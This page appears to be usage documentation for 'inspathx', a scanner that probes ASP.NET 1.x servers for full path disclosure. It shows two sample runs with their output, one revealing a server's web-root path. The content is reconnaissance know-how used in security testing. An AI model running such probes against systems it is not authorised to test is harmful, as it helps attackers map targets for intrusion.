## ASP.NET Full Path Disclosure on DotNet Framework 1.x ##

No need to specify any option for this check to be activated.



**Check on server with error-display ON**


```
$ ruby inspathx.rb -u http://10.3.22.45/

=============================================================
Path Discloser (a.k.a inspathx) / Error Hunter
 (c) Aung Khant, aungkhant[at]yehg.net
  YGN Ethical Hacker Group, Myanmar, http://yehg.net/

svn co http://inspathx.googlecode.com/svn/trunk/ inspathx
=============================================================


# target: http://10.3.22.45
# source: .DUMMY
# log file: 10.3.22.45_.log
# follow redirect: false
# null cookie: false
# total threads: 10
# time: 18:15:31 03-22-2011

[*] testing for dotnet 1.x full path disclosure ..

[*] http://10.3.22.45/~.aspx

# waiting for child threads to finish ..
.


! Server path extracted = D:\inetpub\wwwroot\

# vulnerable url(s) = 1
# total requests = 1
# done at 18:15:36 03-22-2011

Send bugs, suggestions, contributions to inspathx[at]yehg.net
```


**Check on server with error-display OFF**

```
$ ruby inspathx.rb -u http://10.10.233.22/

=============================================================
Path Discloser (a.k.a inspathx) / Error Hunter
 (c) Aung Khant, aungkhant[at]yehg.net
  YGN Ethical Hacker Group, Myanmar, http://yehg.net/

svn co http://inspathx.googlecode.com/svn/trunk/ inspathx
=============================================================


# target: http://10.10.233.22
# source: .DUMMY
# log file: 10.10.233.22_.log
# follow redirect: false
# null cookie: false
# total threads: 10
# time: 18:10:00 03-22-2011

[*] testing for dotnet 1.x full path disclosure ..
[*] regex fails. target aspx application is found to enable custom error handler.

[*] http://10.10.233.22/~.aspx

# waiting for child threads to finish ..
.



# vulnerable url(s) = 1
# total requests = 1
# done at 18:10:05 03-22-2011

Send bugs, suggestions, contributions to inspathx[at]yehg.net
```